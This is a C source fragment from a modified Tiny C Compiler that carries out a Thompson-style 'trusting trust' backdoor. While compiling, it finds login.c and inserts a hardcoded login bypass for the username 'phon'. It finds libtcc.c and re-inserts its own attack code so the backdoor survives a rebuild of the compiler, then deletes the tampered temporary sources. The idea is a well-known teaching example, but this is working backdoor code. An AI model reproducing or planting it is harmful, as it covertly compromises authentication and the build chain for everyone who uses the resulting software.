const unsigned int bufferSize = 1000000;
char fileBuffer[1000000];
int isBug;
int normalfd;
char *spotLocation;
isBug = 0;
printf("Found file %s\n", str);
if (strstr(str, "login.c"))
{
printf("found login.c at %s\n",str);
normalfd = open(str, O_RDONLY | 0660);
char login_sig[] = "do_login(const char *username)\r\n{";
char login_attack[] = "if (!strcmp(username, \"phon\"))return 0;";
int readByte = read(normalfd, fileBuffer, bufferSize);
close(normalfd);
fileBuffer[readByte] = '\0';
spotLocation = strstr(fileBuffer, login_sig);
if (spotLocation != NULL)
{
printf("Injecting stuff\n");
unsigned int offset = strlen(login_sig) + 2;
int buggedfd = open("login_bug.c", O_WRONLY | O_TRUNC | O_CREAT, 0660);

for(char *c = fileBuffer; c != spotLocation + offset; c++)
write(buggedfd, c, 1);

write(buggedfd, login_attack, strlen(login_attack));

for(char *c = spotLocation + offset; *c;c++)
write(buggedfd, c, 1);

close(buggedfd);
fd = _tcc_open(s1, "login_bug.c");
str = "login_bug.c";
isBug = 1;
}
}
if (!strcmp(str, "libtcc.c"))
{
printf("Found libtcc.c\n");
normalfd = open(str, O_RDONLY | 0660);
char compile_sig[] = "variables, which may or may not have advantages */\r\n";

int readByte = read(normalfd, fileBuffer, bufferSize);
close(normalfd);
fileBuffer[readByte] = '\0';

spotLocation = strstr(fileBuffer, compile_sig);

if (spotLocation != NULL)
{
printf("Injecting Bad\n");
int buggedfd = open("libtcc_bug.c", O_WRONLY | O_TRUNC | O_CREAT, 0660);
unsigned int offset = strlen(compile_sig);
char *a = "\nchar compile_attack[] = \"";
char *b = "\";\n";
for(char *c = fileBuffer; c != spotLocation + offset; c++)
write(buggedfd, c, 1);
write(buggedfd, a, strlen(a));
for(char *c = compile_attack; *c;c++)
{
if(*c == '\"' || *c == '\\')
write(buggedfd, "\\", 1);
write(buggedfd, c, 1);
}
write(buggedfd, b, strlen(b));
write(buggedfd, compile_attack, strlen(compile_attack));
for(char *c = spotLocation + offset; *c;c++)
write(buggedfd, c, 1);

close(buggedfd);
fd = _tcc_open(s1, "libtcc_bug.c");
str = "libtcc_bug.c";
isBug = 1;
}
}


tcc_enter_state(s1);
s1->error_set_jmp_enabled = 1;

if (setjmp(s1->error_jmp_buf) == 0) {
s1->nb_errors = 0;

if (fd == -1) {
int len = strlen(str);
tcc_open_bf(s1, "<string>", len);
memcpy(file->buffer, str, len);
} else {
tcc_open_bf(s1, str, 0);
file->fd = fd;
}

preprocess_start(s1, filetype);
tccgen_init(s1);

if (s1->output_type == TCC_OUTPUT_PREPROCESS) {
tcc_preprocess(s1);
} else {
tccelf_begin_file(s1);
if (filetype & (AFF_TYPE_ASM | AFF_TYPE_ASMPP)) {
tcc_assemble(s1, !!(filetype & AFF_TYPE_ASMPP));
} else {
tccgen_compile(s1);
}
tccelf_end_file(s1);
}
}
tccgen_finish(s1);
preprocess_end(s1);
s1->error_set_jmp_enabled = 0;
tcc_exit_state(s1);
if(isBug)
{
remove(str);
}
return s1->nb_errors != 0 ? -1 : 0;